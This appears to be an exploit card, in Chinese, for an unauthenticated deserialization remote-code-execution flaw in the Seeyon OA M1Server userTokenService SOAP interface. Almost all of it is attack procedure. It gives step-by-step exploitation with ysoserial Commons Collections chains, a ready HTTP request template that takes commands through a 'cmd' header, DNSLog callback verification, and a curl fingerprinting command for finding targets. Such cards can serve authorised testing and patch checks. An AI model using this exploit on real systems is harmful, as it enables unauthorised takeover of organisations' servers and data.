---
id: SEEYON-M1SERVER-DESER-RCE
title: 致远OA M1Server userTokenService 反序列化 RCE
product: seeyon-oa
vendor: 北京致远互联
version_affected: "M1"
severity: CRITICAL
tags: [rce, deserialization, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "esn_mobile_pns", "userTokenService"]
---

## 漏洞描述

致远OA M1Server 的 userTokenService SOAP 接口存在 Java 反序列化漏洞，攻击者可利用 Commons Collections 利用链实现未授权 RCE。

## 影响版本

- 致远 M1

## 前置条件

- 无需认证，可直接利用
- 目标需部署 M1Server 移动端服务（esn_mobile_pns）

## 利用步骤

1. 确认目标存在 `/esn_mobile_pns/service/userTokenService` SOAP 接口
2. 使用 ysoserial 生成 Commons Collections 反序列化利用链
3. 通过 SOAP 请求的 `addToken` 方法发送恶意序列化数据
4. 通过 `cmd` header 传入命令，实现远程代码执行

## Payload

```http
POST /esn_mobile_pns/service/userTokenService HTTP/1.1
Host: target
Content-Type: text/xml
cmd: id

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pns.mobile.esn.seeyon.com/">
<soapenv:Header/>
<soapenv:Body>
<ser:addToken>
<arg0>
<aced_commons_collections_payload_here>
</arg0>
</ser:addToken>
</soapenv:Body>
</soapenv:Envelope>
```

使用 ysoserial 生成 Commons Collections 利用链，命令通过 `cmd` header 传入。

## 验证方法

响应中包含命令执行结果，或通过 DNSLog 回连确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/esn_mobile_pns/service/userTokenService"
```
